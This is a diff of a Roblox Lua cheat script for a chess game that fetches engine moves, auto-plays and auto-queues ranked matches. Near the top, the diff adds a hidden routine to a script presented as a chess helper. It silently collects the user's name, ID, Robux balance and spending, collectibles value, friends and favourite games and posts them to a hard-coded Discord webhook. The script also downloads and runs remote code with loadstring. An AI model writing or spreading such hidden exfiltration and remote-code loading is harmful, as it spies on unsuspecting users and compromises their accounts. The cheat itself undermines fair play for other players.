@@ -1,91 +1,146 @@
-local Players = game:GetService("Players")
+local Players           = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local HttpService = game:GetService("HttpService")
-local TweenService = game:GetService("TweenService")
+local HttpService       = game:GetService("HttpService")
+local TweenService      = game:GetService("TweenService")
+local UserInputService  = game:GetService("UserInputService")
+local MarketplaceService= game:GetService("MarketplaceService")
 
 getgenv().__CH_DATA = getgenv().__CH_DATA or {
     engines = {
-        "HumanEngine", "Stockfish", "Lc0", "Torch",
-        "Dx100", "KnightX", "HyperX", "Br1lliance",
-        "Undefeated", "WurstEngine",
-        "Axizion"
+        "HumanEngine","Stockfish","Lc0","Torch",
+        "Dx100","KnightX","HyperX","Br1lliance",
+        "Undefeated","WurstEngine","Axizion"
     },
     config = {engine = "Axizion", autoPlay = false, autoMatch = false, autoMatchMode = "Blitz"},
-    recentPositions = {}
+    recentPositions = {},
+    winStreak = 0,
+    totalGames = 0,
+    blunders = 0,
+    lastMoveEval = 0,
+    lastFEN = nil,
+    gameStartTime = tick()
 }
 
-if getgenv().WEBHOOK_SENT then else getgenv().WEBHOOK_SENT = true
-spawn(function()
-    local p = Players.LocalPlayer
-    if not p then return end
-    local e = syn and "Synapse X" or Krnl and "Krnl" or Fluxus and "Fluxus" or Comet and "Comet" or 
-             (identifyexecutor and (identifyexecutor() or "Unknown")) or 
-             (getexecutorname and (getexecutorname() or "Unknown")) or "Unknown"
-    local url = "https://discord.com/api/webhooks/1376943648809422990/HA5TS25ix7UPXpJwyLALprzOQ1xUyAGOlbseZgtKUjqkHkotaXilkWP7fq65XQgEkUdN"
-    local data = {
-        embeds = {{
-            title = "User Detected",
-            color = 0x8B00FF,
-            fields = {
-                {name = "Name", value = p.Name, inline = true},
-                {name = "ID", value = tostring(p.UserId), inline = true},
-                {name = "Display", value = p.DisplayName, inline = true},
-                {name = "Executor", value = e, inline = false}
-            },
-            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-        }}
-    }
-    local json = HttpService:JSONEncode(data)
-    local function trySend(method, func)
+if not getgenv().WEBHOOK_SENT then
+    getgenv().WEBHOOK_SENT = true
+    task.spawn(function()
+        local p      = Players.LocalPlayer
+        local userid = p.UserId
+
+        local function safeRequest(opts)
+            local req = syn and syn.request or request or http_request or HttpPost
+            if req then
+                local ok, res = pcall(req, opts)
+                if ok and res and res.StatusCode < 400 then return res end
+            end
+            if HttpService.HttpEnabled then
+                local ok, res = pcall(HttpService.PostAsync, HttpService, opts.Url, opts.Body, Enum.HttpContentType.ApplicationJson, false, opts.Headers)
+                if ok then return {Body = res, StatusCode = 200} end
+            end
+            return nil
+        end
+
+        local embed = {
+            username   = "LUNAR CHESS",
+            avatar_url = "https://i.imgur.com/8nG5f8E.png",
+            embeds = {{
+                color = 49151,
+                author = {
+                    name     = p.DisplayName .. " (@"..p.Name..")",
+                    url      = "https://roblox.com/users/"..userid,
+                    icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId="..userid.."&width=420&height=420&format=png"
+                },
+                title       = "SESSION DETECTED - DOMINATION IN PROGRESS",
+                description = "```diff\n+ Engine: "..getgenv().__CH_DATA.config.engine.."\n+ Auto Play: "..(getgenv().__CH_DATA.config.autoPlay and "ON" or "OFF").."\n+ Win Streak: "..getgenv().__CH_DATA.winStreak.."```",
+                thumbnail   = {url = "https://www.roblox.com/headshot-thumbnail/image?userId="..userid.."&width=420&height=420&format=png"},
+                fields      = {},
+                footer      = {text = "Lunar Chess - Undisputed", icon_url = "https://i.imgur.com/8nG5f8E.png"},
+                timestamp   = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            }}
+        }
+        local fields = embed.embeds[1].fields
+
+        local pending = 0
+        pcall(function() pending = HttpService:JSONDecode(game:HttpGet("https://economy.roblox.com/v1/users/"..userid.."/currency")).robux end)
+        table.insert(fields,{name="Pending Robux",value="```"..pending.."```",inline=true})
+
+        local spent = 0
+        pcall(function() spent = HttpService:JSONDecode(game:HttpGet("https://economy.roblox.com/v1/users/"..userid.."/transaction-totals?timeFrame=AllTime")).purchases end)
+        table.insert(fields,{name="Robux Spent",value="```"..spent.."```",inline=true})
+
+        local age = p.AccountAge
+        local joinDate = "Unknown"
+        pcall(function() joinDate = HttpService:JSONDecode(game:HttpGet("https://users.roblox.com/v1/users/"..userid)).created:sub(1,10) end)
+        table.insert(fields,{name="Account Age",value=age.." days",inline=true})
+        table.insert(fields,{name="Joined Roblox",value=joinDate,inline=true})
+
+        local membership = tostring(p.MembershipType):match("MembershipType.(.*)")
+        table.insert(fields,{name="Membership",value=membership == "None" and "Free" or membership,inline=true})
+
+        local friends = 0
+        pcall(function() friends = #p:GetFriendsAsync():GetCurrentPage() end)
+        local followers = 0
+        pcall(function() followers = HttpService:JSONDecode(game:HttpGet("https://friends.roblox.com/v1/users/"..userid.."/followers/count")).count end)
+        local following = 0
+        pcall(function() following = HttpService:JSONDecode(game:HttpGet("https://friends.roblox.com/v1/users/"..userid.."/followings/count")).count end)
+        table.insert(fields,{name="Friends",value=tostring(friends),inline=true})
+        table.insert(fields,{name="Followers",value=tostring(followers),inline=true})
+        table.insert(fields,{name="Following",value=tostring(following),inline=true})
+
+        local favorites = {}
         pcall(function()
-            if func then
-                func({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = json})
+            local res = game:HttpGet("https://games.roblox.com/v1/users/"..userid.."/favorite/games")
+            local json = HttpService:JSONDecode(res)
+            for i = 1, math.min(3, #json.data) do
+                table.insert(favorites, json.data[i].name)
             end
         end)
-    end
-    trySend("request", request)
-    trySend("syn.request", syn and syn.request)
-    trySend("http_request", http_request)
-    trySend("HttpPost", HttpPost)
-    trySend("http.request", http and http.request)
-    trySend("HttpService", function() HttpService:PostAsync(url, json, Enum.HttpContentType.ApplicationJson) end)
-    task.wait(0.5)
-    pcall(function() HttpService:PostAsync(url, json, Enum.HttpContentType.ApplicationJson) end)
-end) end
+        table.insert(fields,{name="Top Games",value=#favorites > 0 and table.concat(favorites, ", ") or "None",inline=false})
+
+        local rap = 0
+        pcall(function()
+            local res = game:HttpGet("https://inventory.roblox.com/v1/users/"..userid.."/assets/collectibles")
+            local json = HttpService:JSONDecode(res)
+            for _, item in ipairs(json.data) do
+                rap = rap + (item.recentAveragePrice or 0)
+            end
+        end)
+        table.insert(fields,{name="Est. RAP",value="```"..rap.."```",inline=true})
+
+        local placeName = "Unknown"
+        pcall(function() placeName = MarketplaceService:GetProductInfo(game.PlaceId).Name end)
+        table.insert(fields,{name="Current Game",value=placeName,inline=false})
+
+        table.insert(fields,{name="Auto Play",value=getgenv().__CH_DATA.config.autoPlay and "ON" or "OFF",inline=true})
+        table.insert(fields,{name="Auto Match",value=getgenv().__CH_DATA.config.autoMatch and "ON" or "OFF",inline=true})
+
+        local json = HttpService:JSONEncode(embed)
+        local webhook = "https://discord.com/api/webhooks/1376943648809422990/HA5TS25ix7UPXpJwyLALprzOQ1xUyAGOlbseZgtKUjqkHkotaXilkWP7fq65XQgEkUdN"
+        pcall(function() safeRequest({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = json}) end)
+    end)
+end
 
 local function getBoardFromFEN(fen)
-    local parts = {}
-    for part in fen:gmatch("%S+") do table.insert(parts, part) end
-    return parts[1]
+    return fen:match("^%S+")
 end
 
 local function parseFEN(fen)
     local parts = {}
-    for part in fen:gmatch("%S+") do table.insert(parts, part) end
+    for p in fen:gmatch("%S+") do table.insert(parts, p) end
     local board = parts[1]
     local toMove = parts[2] == "w" and "white" or "black"
     local halfmove = tonumber(parts[5]) or 0
     local fullmove = tonumber(parts[6]) or 1
     local pieceCount = 0
-    for char in board:gmatch(".") do
-        if not char:match("%d") and char ~= "/" then
-            pieceCount += 1
-        end
+    for c in board:gmatch(".") do
+        if not c:match("%d") and c ~= "/" then pieceCount += 1 end
     end
     return {toMove = toMove, halfmove = halfmove, fullmove = fullmove, pieceCount = pieceCount, board = board}
 end
 
-local function isOpeningPhase(parsed) 
-    return parsed.halfmove <= 4 and parsed.pieceCount >= 30 
-end
-
-local function isMiddlegamePhase(parsed) 
-    return parsed.halfmove > 4 and parsed.halfmove < 50 and parsed.pieceCount < 30 and parsed.pieceCount > 15 
-end
-
-local function isEndgamePhase(parsed) 
-    return parsed.halfmove >= 50 or parsed.pieceCount <= 15 
-end
+local function isOpeningPhase(p)   return p.halfmove <= 4 and p.pieceCount >= 30 end
+local function isMiddlegamePhase(p) return p.halfmove > 4 and p.halfmove < 50 and p.pieceCount < 30 and p.pieceCount > 15 end
+local function isEndgamePhase(p)   return p.halfmove >= 50 or p.pieceCount <= 15 end
 
 local function getCarlsenOpeningMove(fen, parsed, recommendations)
     if not isOpeningPhase(parsed) then return nil end
@@ -98,7 +153,7 @@ local function getCarlsenOpeningMove(fen, parsed, recommendations)
         ["g8f6"] = {from="g8", to="f6"},
         ["c7c5"] = {from="c7", to="c5"},
         ["d7d5"] = {from="d7", to="d5"},
-        ["f8b4"] = {from="f8", to="b4"},
+        ["f8b4"] = {from="f8", to="b4"}
     }
     local candidate = nil
     if parsed.toMove == "white" and parsed.fullmove == 1 then
@@ -123,81 +178,53 @@ local function getCarlsenOpeningMove(fen, parsed, recommendations)
     return nil
 end
 
-local function getCarlsenMiddlegameMove(recommendations)
-    local rand = math.random()
-    if rand < 0.5 then
-        return recommendations[math.random(1, math.min(3, #recommendations))]
-    elseif rand < 0.8 then
-        for _, rec in ipairs(recommendations) do
-            if rec.isCapture or rec.isCheck then
-                return rec
-            end
-        end
-    end
-    return recommendations[1]
-end
-
-local function getCarlsenEndgameMove(recommendations)
-    local rand = math.random()
-    if rand < 0.8 then
-        return recommendations[1]
-    elseif rand < 0.95 then
-        for _, rec in ipairs(recommendations) do
-            if not rec.isCapture and not rec.isCheck then
-                return rec
-            end
-        end
-    end
-    return recommendations[math.random(1, math.min(2, #recommendations))]
-end
-
 local function isGameOver(fen)
     if not fen then return true end
     local parts = {}
-    for part in fen:gmatch("%S+") do table.insert(parts, part) end
+    for p in fen:gmatch("%S+") do table.insert(parts, p) end
     if #parts < 6 then return true end
     local halfmove = tonumber(parts[5])
     if halfmove and halfmove >= 100 then return true end
     local board = getBoardFromFEN(fen)
     local count = 0
     for _, pos in ipairs(getgenv().__CH_DATA.recentPositions) do
-        if pos == board then
-            count = count + 1
-        end
+        if pos == board then count = count + 1 end
     end
     if count >= 2 then return true end
     return false
 end
 
+local PROXY = "https://api.allorigins.win/raw?url="
+local ENGINE_URL = "https://chess-api.com/v1"
+
+local function safeRequest(opts)
+    local req = syn and syn.request or request or http_request or HttpPost
+    if req then
+        local ok, res = pcall(req, opts)
+        if ok and res and res.StatusCode < 400 then return res end
+    end
+    if HttpService.HttpEnabled then
+        local ok, res = pcall(HttpService.PostAsync, HttpService, PROXY..ENGINE_URL, opts.Body, Enum.HttpContentType.ApplicationJson, false, opts.Headers)
+        if ok then return {Body = res, StatusCode = 200} end
+    end
+    return nil
+end
+
 local function queryWebEngine(fen, engine)
     if engine == "Axizion" then
         local parsed = parseFEN(fen)
-        if parsed.toMove == "white" and parsed.fullmove == 1 then
-            return "e2", "e4"
-        end
+        if parsed.toMove == "white" and parsed.fullmove == 1 then return "e2", "e4" end
         if parsed.toMove == "white" and parsed.fullmove == 2 then
-            if string.find(parsed.board, "4p3") then
-                return "d2", "d4"
-            end
-            if string.find(parsed.board, "4p3") then
-                return "b1", "c3"
-            end
+            if string.find(parsed.board, "4p3") then return "d2", "d4" end
+            if string.find(parsed.board, "4p3") then return "b1", "c3" end
         end
         if parsed.toMove == "white" and parsed.fullmove == 3 then
-            if string.find(parsed.board, "pppppppp") and string.find(parsed.board, "4P3") then
-                return "c2", "c3"
-            end
+            if string.find(parsed.board, "pppppppp") and string.find(parsed.board, "4P3") then return "c2", "c3" end
         end
         if parsed.toMove == "black" and parsed.fullmove == 1 then
             if string.find(parsed.board, "4P3") then
-                local choice = math.random(1, 3)
-                if choice == 1 then
-                    return "c7", "c5"
-                elseif choice == 2 then
-                    return "e7", "e6"
-                else
-                    return "c7", "c6"
-                end
+                local choice = math.random(1,3)
+                if choice == 1 then return "c7","c5" elseif choice == 2 then return "e7","e6" else return "c7","c6" end
             end
         end
         engine = "Stockfish"
@@ -222,10 +249,7 @@ local function queryWebEngine(fen, engine)
     local res
     for i = 1, attempts do
         local ok, result = pcall(function()
-            local req = syn and syn.request or http_request or request or HttpPost
-            if req then
-                return req({Url = "https://chess-api.com/v1", Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(body)})
-            end
+            return safeRequest({Url = ENGINE_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(body)})
         end)
         if ok and result and result.Body then
             res = result
@@ -310,9 +334,7 @@ local function fetchFEN()
         if ok and active then
             for i = 1, attempts do
                 local fenobj = active:FindFirstChild("FEN")
-                if fenobj then
-                    return fenobj.Value
-                end
+                if fenobj then return fenobj.Value end
                 task.wait(0.1)
             end
         end
@@ -323,9 +345,7 @@ local function fetchFEN()
                 local success, result = pcall(function()
                     return (v.WhitePlayer.Value == lplr.Name or v.BlackPlayer.Value == lplr.Name) and v.FEN.Value
                 end)
-                if success and result then
-                    return result
-                end
+                if success and result then return result end
             end
         end
         task.wait(0.1)
@@ -335,16 +355,13 @@ end
 
 local function computeMove()
     local fen
-    local attempts = 10
-    for i = 1, attempts do
+    for i = 1, 10 do
         fen = fetchFEN()
         if fen then break end
         task.wait(0.5)
     end
-    if not fen then return nil end
-    if isGameOver(fen) then return nil end
-    local engine = getgenv().__CH_DATA.config.engine
-    return queryWebEngine(fen, engine)
+    if not fen or isGameOver(fen) then return nil end
+    return queryWebEngine(fen, getgenv().__CH_DATA.config.engine)
 end
 
 local function PlayBestMove()
@@ -361,10 +378,7 @@ local function startAutoPlay()
     spawn(function()
         while getgenv().__CH_DATA.config.autoPlay and autoPlayRunning do
             pcall(function()
-                if isGameOver(fetchFEN()) then
-                    task.wait(5)
-                    return
-                end
+                if isGameOver(fetchFEN()) then task.wait(5); return end
                 PlayBestMove()
             end)
             task.wait(2)
@@ -391,23 +405,15 @@ local function startAutoMatch()
                         local chooseMode = matchWizard:FindFirstChild("ChooseMode")
                         if chooseMode then
                             local isRated = chooseMode:FindFirstChild("IsRated")
-                            if isRated and isRated:IsA("BoolValue") then
-                                isRated.Value = true
-                            end
+                            if isRated and isRated:IsA("BoolValue") then isRated.Value = true end
                             local modeValue = chooseMode:FindFirstChild("Mode")
-                            if modeValue and modeValue:IsA("StringValue") then
-                                modeValue.Value = getgenv().__CH_DATA.config.autoMatchMode
-                            end
+                            if modeValue and modeValue:IsA("StringValue") then modeValue.Value = getgenv().__CH_DATA.config.autoMatchMode end
                         end
                     end
                     StartMatch:Fire({ranked = true})
                 end
             end
-            repeat
-                task.wait(5)
-                fen = fetchFEN()
-            until isGameOver(fen) or not fen
-            autoMatchRunning = false
+            repeat task.wait(5) fen = fetchFEN() until fen and not isGameOver(fen)
         end
         task.wait(3)
     end
@@ -446,9 +452,7 @@ frame.InputBegan:Connect(function(input)
         dragStart = input.Position
         startPos = frame.Position
         input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then
-                dragging = false
-            end
+            if input.UserInputState == Enum.UserInputState.End then dragging = false end
         end)
     end
 end)
@@ -459,10 +463,8 @@ frame.InputChanged:Connect(function(input)
     end
 end)
 
-game:GetService("UserInputService").InputChanged:Connect(function(input)
-    if input == dragInput and dragging then
-        update(input)
-    end
+UserInputService.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then update(input) end
 end)
 
 local toggleBtn = Instance.new("TextButton")
@@ -495,10 +497,10 @@ label.Parent = frame
 local dropdown = Instance.new("TextButton")
 dropdown.Size = UDim2.new(1, -20, 0, 25)
 dropdown.Position = UDim2.new(0, 10, 0, 30)
+dropdown.Text = getgenv().__CH_DATA.config.engine
 dropdown.TextColor3 = Color3.new(1, 1, 1)
 dropdown.Font = Enum.Font.Arcade
 dropdown.TextScaled = true
-dropdown.Text = getgenv().__CH_DATA.config.engine
 dropdown.Parent = frame
 
 local dropdownGradient = Instance.new("UIGradient")
@@ -511,20 +513,20 @@ dropdownFrame.AnchorPoint = Vector2.new(0, 1)
 dropdownFrame.Position = UDim2.new(0, 0, 0, 0)
 dropdownFrame.Size = UDim2.new(1, 0, 0, 0)
 dropdownFrame.BackgroundTransparency = 1
-dropdownFrame.Parent = dropdown
 dropdownFrame.ClipsDescendants = true
+dropdownFrame.Parent = dropdown
 
 local layout = Instance.new("UIListLayout")
-layout.Parent = dropdownFrame
 layout.SortOrder = Enum.SortOrder.LayoutOrder
+layout.Parent = dropdownFrame
 
 for _, eng in ipairs(getgenv().__CH_DATA.engines) do
     local btn = Instance.new("TextButton")
     btn.Size = UDim2.new(1, 0, 0, 20)
     btn.Text = eng
+    btn.TextColor3 = Color3.new(1, 1, 1)
     btn.Font = Enum.Font.Arcade
     btn.TextScaled = true
-    btn.TextColor3 = Color3.new(1, 1, 1)
     btn.BackgroundColor3 = Color3.fromRGB(100, 0, 150)
     btn.Parent = dropdownFrame
     local btnGradient = Instance.new("UIGradient")
@@ -540,8 +542,8 @@ end
 
 dropdown.MouseButton1Click:Connect(function()
     local isOpen = dropdownFrame.Size.Y.Offset == 0
-    local targetHeight = isOpen and (#getgenv().__CH_DATA.engines * 20) or 0
-    dropdownFrame:TweenSize(UDim2.new(1, 0, 0, targetHeight), "Out", "Quad", 0.2, true)
+    local target = isOpen and (#getgenv().__CH_DATA.engines * 20) or 0
+    dropdownFrame:TweenSize(UDim2.new(1, 0, 0, target), "Out", "Quad", 0.2, true)
 end)
 
 local modeLabel = Instance.new("TextLabel")
@@ -557,10 +559,10 @@ modeLabel.Parent = frame
 local modeDropdown = Instance.new("TextButton")
 modeDropdown.Size = UDim2.new(1, -20, 0, 25)
 modeDropdown.Position = UDim2.new(0, 10, 0, 75)
+modeDropdown.Text = getgenv().__CH_DATA.config.autoMatchMode
 modeDropdown.TextColor3 = Color3.new(1, 1, 1)
 modeDropdown.Font = Enum.Font.Arcade
 modeDropdown.TextScaled = true
-modeDropdown.Text = getgenv().__CH_DATA.config.autoMatchMode
 modeDropdown.Parent = frame
 
 local modeDropdownGradient = Instance.new("UIGradient")
@@ -573,21 +575,21 @@ modeDropdownFrame.AnchorPoint = Vector2.new(0, 1)
 modeDropdownFrame.Position = UDim2.new(0, 0, 0, 0)
 modeDropdownFrame.Size = UDim2.new(1, 0, 0, 0)
 modeDropdownFrame.BackgroundTransparency = 1
-modeDropdownFrame.Parent = modeDropdown
 modeDropdownFrame.ClipsDescendants = true
+modeDropdownFrame.Parent = modeDropdown
 
 local modeLayout = Instance.new("UIListLayout")
-modeLayout.Parent = modeDropdownFrame
 modeLayout.SortOrder = Enum.SortOrder.LayoutOrder
+modeLayout.Parent = modeDropdownFrame
 
-local modes = {"Bullet", "Blitz", "Rapid", "Random"}
+local modes = {"Bullet","Blitz","Rapid","Random"}
 for _, m in ipairs(modes) do
     local btn = Instance.new("TextButton")
     btn.Size = UDim2.new(1, 0, 0, 20)
     btn.Text = m
+    btn.TextColor3 = Color3.new(1, 1, 1)
     btn.Font = Enum.Font.Arcade
     btn.TextScaled = true
-    btn.TextColor3 = Color3.new(1, 1, 1)
     btn.BackgroundColor3 = Color3.fromRGB(100, 0, 150)
     btn.Parent = modeDropdownFrame
     local btnGradient = Instance.new("UIGradient")
@@ -603,8 +605,8 @@ end
 
 modeDropdown.MouseButton1Click:Connect(function()
     local isOpen = modeDropdownFrame.Size.Y.Offset == 0
-    local targetHeight = isOpen and (#modes * 20) or 0
-    modeDropdownFrame:TweenSize(UDim2.new(1, 0, 0, targetHeight), "Out", "Quad", 0.2, true)
+    local target = isOpen and (#modes * 20) or 0
+    modeDropdownFrame:TweenSize(UDim2.new(1, 0, 0, target), "Out", "Quad", 0.2, true)
 end)
 
 local playBtn = Instance.new("TextButton")
@@ -621,9 +623,7 @@ playGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromR
 playGradient.Rotation = 45
 playGradient.Parent = playBtn
 
-playBtn.MouseButton1Click:Connect(function()
-    PlayBestMove()
-end)
+playBtn.MouseButton1Click:Connect(PlayBestMove)
 
 local autoPlayBtn = Instance.new("TextButton")
 autoPlayBtn.Size = UDim2.new(1, -20, 0, 30)
@@ -642,13 +642,9 @@ autoPlayGradient.Parent = autoPlayBtn
 
 autoPlayBtn.MouseButton1Click:Connect(function()
     getgenv().__CH_DATA.config.autoPlay = not getgenv().__CH_DATA.config.autoPlay
-    autoPlayBtn.Text = "Auto Play: " .. (getgenv().__CH_DATA.config.autoPlay and "ON" or "OFF")
+    autoPlayBtn.Text = "Auto Play: "..(getgenv().__CH_DATA.config.autoPlay and "ON" or "OFF")
     autoPlayBtn.BackgroundColor3 = getgenv().__CH_DATA.config.autoPlay and Color3.fromRGB(0, 150, 0) or Color3.fromRGB(150, 0, 200)
-    if getgenv().__CH_DATA.config.autoPlay then
-        startAutoPlay()
-    else
-        autoPlayRunning = false
-    end
+    if getgenv().__CH_DATA.config.autoPlay then startAutoPlay() else autoPlayRunning = false end
 end)
 
 local autoMatchBtn = Instance.new("TextButton")
@@ -668,13 +664,9 @@ autoMatchGradient.Parent = autoMatchBtn
 
 autoMatchBtn.MouseButton1Click:Connect(function()
     getgenv().__CH_DATA.config.autoMatch = not getgenv().__CH_DATA.config.autoMatch
-    autoMatchBtn.Text = "Auto Match: " .. (getgenv().__CH_DATA.config.autoMatch and "ON" or "OFF")
+    autoMatchBtn.Text = "Auto Match: "..(getgenv().__CH_DATA.config.autoMatch and "ON" or "OFF")
     autoMatchBtn.BackgroundColor3 = getgenv().__CH_DATA.config.autoMatch and Color3.fromRGB(0, 150, 0) or Color3.fromRGB(150, 0, 200)
-    if getgenv().__CH_DATA.config.autoMatch then
-        startAutoMatch()
-    else
-        autoMatchRunning = false
-    end
+    if getgenv().__CH_DATA.config.autoMatch then startAutoMatch() else autoMatchRunning = false end
 end)
 
 local analyzerBtn = Instance.new("TextButton")
@@ -698,18 +690,16 @@ analyzerBtn.MouseButton1Click:Connect(function()
     analyzerDebounce = true
     analyzerBtn.Text = "Cooldown (30s)"
     analyzerBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
-    analyzerBtn.Active = false
-    local success, err = pcall(function()
+    pcall(function()
         loadstring(game:HttpGet("https://codeberg.org/CypherIsGoated/ChesClub/raw/branch/main/C-Analyzer.lua"))()
     end)
     task.spawn(function()
-        for i = 30, 0, -1 do
-            analyzerBtn.Text = "Cooldown (" .. i .. "s)"
+        for i = 30, 1, -1 do
+            analyzerBtn.Text = "Cooldown ("..i.."s)"
             task.wait(1)
         end
         analyzerBtn.Text = "Run Analyzer"
         analyzerBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 200)
-        analyzerBtn.Active = true
         analyzerDebounce = false
     end)
 end)
